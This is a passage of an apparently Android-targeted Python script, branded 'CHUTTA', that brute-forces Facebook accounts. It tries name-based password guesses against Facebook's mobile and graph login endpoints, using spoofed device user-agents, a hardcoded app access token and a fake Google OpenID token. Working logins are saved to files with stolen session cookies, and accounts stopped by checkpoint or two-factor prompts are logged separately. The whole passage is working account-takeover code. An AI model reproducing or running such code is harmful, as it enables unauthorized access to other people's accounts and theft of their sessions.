'User-Agent': ua,
'X-Fb-Connection-Quality': 'EXCELLENT',
'Authorization': 'OAuth null',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'unknown',
'X-Fb-Device-Group': '6060',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '2126'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [CHUTTA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/CHUTTA-M1-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[CHUTTA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api3(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [CHUTTA-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua  =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-CHUTTA-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-CHUTTA-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-CHUTTA-ua-mobile': '?0','sec-CHUTTA-ua-model': '"RMX2195"','sec-CHUTTA-ua-platform': '"Android"', 'sec-CHUTTA-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetCHUTTA-site': 'same-origin', 'sec-fetCHUTTA-mode': 'navigate', 'sec-fetCHUTTA-user': '?1', 'sec-fetCHUTTA-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aking=session.cookies.get_dict().keys()
                        if "c_user" in Aking:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [CHUTTA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/CHUTTA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/CHUTTA-M2-COOKIE-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CHUTTA-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:pass
        loop+=1
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M3 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [CHUTTA-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.61;FBBV/787895399;FBDM/{density=1.5,width=720,height=1280};FBLC/en_IN;FBRV/387109426;FBCR/Personal;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/23116PN5BC;FBSV/14.0;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'EXCELLENT',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'unknown',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [CHUTTA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/CHUTTA-M3-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/CHUTTA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[CHUTTA-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [CHUTTA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/CHUTTA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api3(ids,names,passlist)
        except Exception as e:
                pass
                
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M4 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#

                
menu()
